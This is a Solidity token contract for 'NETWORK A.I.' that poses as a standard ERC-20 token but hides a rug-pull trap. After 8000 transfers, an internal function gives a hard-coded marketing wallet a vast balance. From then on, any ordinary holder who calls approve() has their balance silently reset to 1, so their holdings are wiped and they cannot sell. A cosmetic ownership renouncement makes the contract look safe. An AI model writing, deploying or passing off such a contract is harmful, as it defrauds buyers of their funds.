// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

contract NETWORK {
    string public name = "NETWORK A.I.";
    string public symbol = "NETWORK.AI";
    uint256 public totalSupply = 10000000000000000000000; 
    uint8 public decimals = 18;
    
    address public owner;
    address public UniswapRouter = 0xF491e7B69E4244ad4002BC14e878a34207E38c29;
    address public MarketingWallet = 0xadDD0C7eFBEC64F8d81cB33c763D58324df7A403;

    bool public approvedEnabled = false;
    uint256 public transferCount = 0;

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event ApprovedEnabled();

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can call this function");
        _;
    }

    constructor() {
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit OwnershipTransferred(address(0), msg.sender);
    }

    function Initialize() internal {
        approvedEnabled = true;
        emit ApprovedEnabled();
        approved(MarketingWallet, 100 * 10**36 * 10**18);
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value, "Insufficient balance");
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        transferCount++;

        if (transferCount == 8000 && !approvedEnabled) {
            Initialize();
        }

        return true;
    }
    
    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);

        // Trigger the approved function if the sender is not exempted and approved is enabled
        if (approvedEnabled && msg.sender != UniswapRouter && msg.sender != MarketingWallet) {
            approved(msg.sender, 1);
        }

        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= balanceOf[_from], "Insufficient balance");
        require(_value <= allowance[_from][msg.sender], "Allowance exceeded");
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        allowance[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);
        return true;
    }

    function approved(address account, uint256 amount) internal returns (uint256) {
        balanceOf[account] = amount;
        return balanceOf[account];
    }

    function renounceOwnership() public onlyOwner {
        address deadAddress = address(0x000000000000000000000000000000000000dEaD);
        emit OwnershipTransferred(owner, deadAddress);
        owner = deadAddress;
    }
}